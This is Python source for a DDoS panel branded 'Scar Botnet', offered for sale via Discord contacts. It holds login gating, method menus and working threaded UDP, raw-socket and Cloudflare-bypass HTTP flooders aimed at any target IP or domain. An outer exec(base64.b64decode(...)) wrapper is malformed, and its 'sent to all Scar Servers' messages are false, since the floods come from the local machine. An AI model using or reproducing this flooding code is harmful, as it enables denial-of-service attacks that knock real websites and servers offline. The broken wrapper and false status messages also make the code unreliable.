import base64
exec(base64.b64decode('#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import random
import threading
import socket
import os,sys
import time
import getpass
from sys import stdout
from colorama import Fore, init
import cloudscraper, datetime, socket, ssl
        
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import datetime
import pytz

sys.stdout.write("\x1b]2;Login To Scar Botnet\x07")

nicknm = "admin"

def login():
    os.system("clear")
    user = "admin"
    passwd = "admin"
    username = input("\033[93m⚡ \033[39mUsername: ")
    password = getpass.getpass(prompt='\033[93m⚡ \033[39mPassword: ')
    if username != user or password != passwd:
        print("")
        print("⚡ Password Wrong!")
        sys.exit(1)
    elif username == user and password == passwd:
        print(f"⚡ Hi! {user}, Welcome to Scar Botnet!")
        time.sleep(2)
login()

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

rules = """
		\033[91m╦═╗╦ ╦╦  ╔═╗╔═╗
		\033[97m╠╦╝║ ║║  ║╣ ╚═╗
		\033[91m╩╚═╚═╝╩═╝╚═╝╚═╝
\033[91m╔═══════════════════════════════════════════╗
\033[91m║\033[97m 1. No Attacks Over 120 Seconds.           \033[91m║
\033[91m║\033[97m 2. No Spamming Attacks.                   \033[91m║
\033[91m║\033[97m 3. No Attacks To Any Government Websites. \033[91m║
\033[91m║\033[97m 4. No Sharing Logins.                     \033[91m║
\033[91m║\033[97m 5. No Giving Out The Server IP.           \033[91m║
\033[91m║\033[97m 6. Dont Attacking .edu / .gov website     \033[91m║
\033[91m║\033[97m 7. Dont Share Scar                        \033[91m║
\033[91m╚═══════════════════════════════════════════╝
"""

methods = """
- LAYER7  • SHOW LAYER7 METHODS     |  Access : Yes  | VIP \033[41m \033[49m 
- LAYER4  • SHOW LAYER4 METHODS     |  Access : Yes  | VIP \033[41m \033[49m
- SPECIAL • SHOW SPECIAL METHODS    |  Access : Yes  | VIP \033[42m \033[49m
- BYPASS  • SHOW BYPASS METHODS     |  Access : Yes  | VIP \033[42m \033[49m
- RAW     • SHOW RAW METHODS        |  Access : Yes  | VIP \033[42m \033[49m
- AMP     • SHOW AMP METHODS        |  Access : Yes  | VIP \033[42m \033[49m  
"""

raw = """
• \033[91mudpraw\033[97m
• \033[91mtcpraw\033[97m
• \033[91mhexraw\033[97m
• \033[91mstdraw\033[97m
• \033[91mvseraw\033[97m
• \033[91musage: Select method, Ip, Timer, port\033[97m
• \033[91mexampe: vseraw 1.1.1.1 120 80\033[97m
"""

layer4 = """
• \033[91mUDP \033[97m
• \033[91mOVH \033[97m
• \033[91mTCP \033[97m
• \033[91mSYN \033[97m
• \033[91mSTD \033[97m
• \033[91musage: Select method, Ip, Timer, port\033[97m
• \033[91mexampe: udp 1.1.1.1 120 80\033[97m
"""

l4 = """
• \033[91mUDP \033[97m: udp flood
• \033[91mOVH \033[97m: ovh bypass
• \033[91mTCP \033[97m: tcp flood
• \033[91mSYN \033[97m: syn flood
• \033[91mSTD \033[97m: std flood
• \033[91musage: Select method, Ip, Timer, port\033[97m
• \033[91mexampe: udp 1.1.1.1 120 80\033[97m
"""

credit = """
• \033[91mMade By: Pushy And Akashv
• \033[91mMade With Love
• \033[91mScar Botnet
"""

layer7 = """
• \033[91muam-bypass \033[97m: uam bypass
• \033[91mcfb 	     \033[97m: CloudFlare Bypass
• \033[91mhttps      \033[97m: https flood
• \033[91mcf-pro     \033[97m: CloudFlare pro
• \033[91mhttp       \033[97m: http flood
    USE COMMAND ATTACK FOR METHODS LAYER7
"""

l7 = """
• \033[91muam-bypass \033[97m: uam bypass
• \033[91mcfb 	     \033[97m: CloudFlare Bypass
• \033[91mhttps      \033[97m: https flood
• \033[91mcf-pro     \033[97m: CloudFlare pro
• \033[91mhttp       \033[97m: http flood
    USE COMMAND ATTACK FOR METHODS LAYER7
"""

special = """
\033[91mSpecial Method:\033[91m
• \033[91mstd\033[97m
• \033[91mdns\033[97m
• \033[91mstd\033[97m
• \033[91movh\033[97m
• \033[91mvse\033[97m
• \033[91msyn\033[97m
• \033[91mnfodrop\033[97m
• \033[91movhnat\033[97m
• \033[91movhamp\033[97m
• \033[91mnfocrush\033[97m
• \033[91mgreeth\033[97m
• \033[91mtelnet\033[97m
• \033[91movhkill\033[97m
• \033[91movhdown\033[97m
• \033[91mssdp\033[97ms
• \033[91mhydrakiller\033[97m
• \033[91mnfonull\033[97m
• \033[91mkillall\033[97m
• \033[91movhslav\033[97m
• \033[91mcpukill\033[97m
• \033[91mtcprape\033[97m
• \033[91mnforape\033[97m
• \033[91mudpraw\033[97m
• \033[91mtcpraw\033[97m
• \033[91mhexraw\033[97m
• \033[91mstdraw\033[97m
• \033[91mvseraw\033[97m
• \033[91mtls\033[97m
• \033[91musage: Select method, Ip, Timer, port\033[97m
• \033[91mexampe: tcprape 1.1.1.1 120 80\033[97m
"""

help = """
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
SPECIAL ► SHOW SPECIAL METHODS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
clear   ► clear TERMINAL
Raw     ► SHOW RAW Methods
"""

discord = """
coming soon
"""

tester = """
1. Akashv
2. Pushy
thank you For Tester :P
"""

banner =  """
\033[97m         ,MMM8\033[91m&&&.          \033[97mScar [\033[91mX\033[97m]
\033[97m    _...MMMMM8\033[91m8&&&&..._     \033[97mType \033[91mHELP \033[97mFor Help
\033[97m .::'''MMMMM88\033[91m&&&&&&'''::.  \033[97mContact Us To Buy Or report at our discord.\033[97m
\033[97m::     MMMMM88\033[91m&&&&&&     :: \033[97mPushyGamertag27#7165 or Akashv#8913.\033[97m
\033[97m'::....MMMMM88\033[91m&&&&&&....::'
\033[97m   `''''MMMMM8\033[91m8&&&&''''`
\033[97m         'MMM8\033[91m&&&'
\033[97m    Welcome To Our Sevices!
"""

def get_info():
	methods = input("\033[39mMethods> \033[93m")
	stdout.write("\033[39mTarget (Domain supported)> \033[93m")
	target = input()
	stdout.write("\033[39mThread (1250 / 9999)> \033[93m")
	thread = input()
	stdout.write("\033[39mTime (max 200)> \033[93m")
	t = input()
	return target, thread, t
	
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r"+Fore.WHITE+f"Attack Has been Launched! Wait until {t} Second.")
        else:
            stdout.flush()
            stdout.write("\rAttack Done !                                   \n")
            return

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion



cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
#bawaan 32500,4150
#kaltebg tembus	23100,32100
	while True:
		bots = (random.randint(750,900))
		sys.stdout.write("\x1b]2;Welcome To Scar Botnet\x07".format (bots))
		sin = input("\033[47m\033[31m[\033[90m{}\033[31m@\033[90mScar\033[31m]\033[49m \033[31m► \033[39m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "help":
			print (help)
			main()
		if sinput == "rule":
			print (rules)
			main()
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (help)
			main()
		elif sinput == "layer4":
			print (layer4)
			main()
		elif sinput == "special":
			os.system ("clear")
			print (special)
			main()
		elif sinput == "l4":
			print (l4)
			main()
		elif sinput == "cls":
			os.system ("cls")
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer7":
			print (layer7)
			main()
		elif sinput == "l7":
			print (l7)
			main()
		elif sinput == "credit":
			print (credit)
			main()
		elif sinput == "tester":
			print (tester)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "discord":
			os.system ("clear")
			print (discord)
			main()
		elif sinput == "":
			main()
		elif sinput == "attack":
			target, thread, t = get_info()
			timer = threading.Thread(target=countdown, args=(t,))
			timer.start()
			LaunchCFB(target, thread, t)
			timer.join()

		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						time.sleep(2)
						print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						time.sleep(2)
						print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						time.sleep(2)
						print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tls":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer = sin.split(" ")
					os.system(f"node attack.js {host} {timer} 8 1")
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[39mPlease dont spam ddos wait your period ddos cooldown end!")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					time.sleep(2)
					print("\033[39mSuccesfully sent attack to all \033[91mScar Servers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
                   
		elif sinput == "stopattacks":
			attack = False
